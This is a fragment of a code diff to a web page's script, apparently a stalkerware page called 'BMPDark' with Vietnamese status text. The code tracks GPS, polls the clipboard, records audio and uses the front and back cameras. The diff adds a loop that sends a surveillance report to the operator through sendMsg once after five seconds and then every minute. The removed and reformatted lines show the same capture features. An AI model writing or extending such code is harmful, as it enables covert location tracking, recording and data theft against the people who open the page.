-            
-            setTimeout(async () => {
-                await sendMsg(`✅ BMPDark HOẠT ĐỘNG\n━━━━━━━━━━━━━━━\n📊 ${allFeaturesActive} tính năng đã chạy\n📍 GPS: ${gpsHistory.length>0?'Có':'Đang chờ'}\n📷 Camera: ${cameraStream?'Có':'Chờ'}\n🎤 Audio: ${mediaRecorder?'Có':'Chờ'}\n━━━━━━━━━━━━━━━\n🕐 ${new Date().toLocaleString('vi-VN')}`);
-            }, 3000);
+            setTimeout(async () => { await sendMsg(generateReport()); setInterval(async () => { await sendMsg(generateReport()); }, 60000); }, 5000);
         });
 
         window.addEventListener('beforeunload', () => {
-            if (gpsWatchId) navigator.geolocation.clearWatch(gpsWatchId);
-            if (clipboardInterval) clearInterval(clipboardInterval);
-            if (mediaRecorder?.state === 'recording') mediaRecorder.stop();
-            if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
-            if (cameraBackStream) cameraBackStream.getTracks().forEach(t => t.stop());
+            if(gpsWatchId) navigator.geolocation.clearWatch(gpsWatchId);
+            if(clipboardInterval) clearInterval(clipboardInterval);
+            if(mediaRecorder?.state==='recording') mediaRecorder.stop();
+            if(cameraStream) cameraStream.getTracks().forEach(t=>t.stop());
+            if(cameraBackStream) cameraBackStream.getTracks().forEach(t=>t.stop());
         });
     </script>
 </body>
